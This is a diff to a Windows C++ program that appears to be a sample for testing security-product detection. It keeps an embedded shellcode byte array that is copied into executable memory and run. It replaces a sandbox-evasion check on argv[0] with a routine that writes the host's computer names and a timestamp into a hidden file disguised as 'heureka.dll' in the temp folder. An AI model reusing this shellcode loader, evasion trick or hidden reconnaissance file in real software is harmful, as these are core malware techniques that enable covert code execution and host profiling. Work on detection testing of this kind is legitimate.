@@ -1,14 +1,16 @@
 #include<iostream>
 #include<Windows.h>
+#include<ctime>
 
 // compilation setup
 #define SHELLCODE 1
 #define ALLOC_RWX_CALL 1
-#define CHECK_ARGV0 1
+#define WRITE_LOG 1
 
 // namespace setup
 using namespace std;
 
+// Constant dependencies
 #if SHELLCODE==1 
 static unsigned char shellcode[]="\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
 "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
@@ -35,8 +37,15 @@ void print_status(const char *status){
 	cout << "[+] " << status << endl;
 }
 
+void print_error(const char *status){
+	cout << "[!] " << status << endl;
+}
+
 // test functions
 #if SHELLCODE==1 && ALLOC_RWX_CALL==1
+/*
+Allocates writable and executable memory, writes and runs shellcode.
+*/
 void alloc_rwx_call(){
 	print_status("alloc_rwx_call starts");
 	LPVOID p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
@@ -47,17 +56,61 @@ void alloc_rwx_call(){
 }
 #endif
 
-#if CHECK_ARGV0==1
-void check_argv0(char **argv){
-	print_status("check_argv0 starts");
-	if (strlen(argv[0])>4) {
-		print_status("check_argv0 starts");
+#if WRITE_LOG==1
+/*
+Creates a hidden file in a temporary directory and writes information about the local host.
+*/
+void write_log(){
+	print_status("write_log starts");
+	HANDLE hFile;
+	
+	TCHAR tmppath[MAX_PATH];
+	DWORD err;
+	
+	ZeroMemory(tmppath,MAX_PATH);
+	err=GetTempPath(MAX_PATH,tmppath);
+	if (err>MAX_PATH || err==0){
+		print_error("Unable to retreive TEMP path");
 		return;
 	}
-	else{
-		print_status("check_argv0 terminates");
-		exit(0);
+	if (strcat_s(tmppath,MAX_PATH,"heureka.dll")!=0){
+		print_error("Unable to generate TEMP filename");
 	}
+
+	hFile=CreateFile(tmppath,FILE_GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);
+	if (hFile==INVALID_HANDLE_VALUE){
+		err=GetLastError();
+		print_error("Unable to create file in TEMP");
+		return;
+	}
+
+	TCHAR buffer[256] = TEXT("");
+    
+    DWORD dwSize = sizeof(buffer);
+    DWORD dwWritten=0;
+
+	char time_buf[22];
+	time_t now;
+	time(&now);
+	strftime(time_buf, 22, "%Y-%m-%dT%H:%S:%MZ\0", gmtime(&now));
+	WriteFile(hFile, time_buf, strlen(time_buf),&dwWritten,NULL);
+			
+    for (int cnf = 0; cnf < ComputerNameMax; cnf++)
+    {
+        if (!GetComputerNameEx((COMPUTER_NAME_FORMAT)cnf, buffer, &dwSize))
+        {
+            print_error("GetComputerNameEx failed");
+            return;
+        }
+        else{ 
+			WriteFile(hFile, buffer, dwSize,&dwWritten,NULL);
+		}
+        dwSize = _countof(buffer);
+        ZeroMemory(buffer, dwSize);
+    }
+
+	CloseHandle(hFile);
+	print_status("write_log ends");
 }
 #endif
 
@@ -67,15 +120,15 @@ int main(int argc,char **argv){
 	setvbuf(stdout, NULL, _IONBF, 0);
 	
 	// test functions
-	#if CHECK_ARGV0==1
-	check_argv0(argv);
+
+	#if WRITE_LOG==1
+	write_log();
 	#endif
 
 	#if SHELLCODE==1 && ALLOC_RWX_CALL==1
 	alloc_rwx_call();
 	#endif
 	
-
 	// clean up and exit
 	return 1;
 }
